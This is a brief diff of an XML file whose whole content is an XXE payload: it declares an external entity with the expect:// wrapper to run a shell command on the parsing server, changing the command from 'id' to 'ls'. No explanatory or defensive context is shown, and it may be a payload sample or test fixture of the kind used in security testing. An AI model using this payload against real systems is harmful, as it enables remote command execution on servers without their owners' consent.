@@ -1,9 +1,9 @@
 <?xml version="1.0"?>
 <!DOCTYPE root [
-  <!ENTITY rce SYSTEM "expect://id">
+  <!ENTITY cmd SYSTEM "expect://ls">
 ]>
 <data>
   <result>
-    &rce;
+    &cmd;
   </result>
 </data>
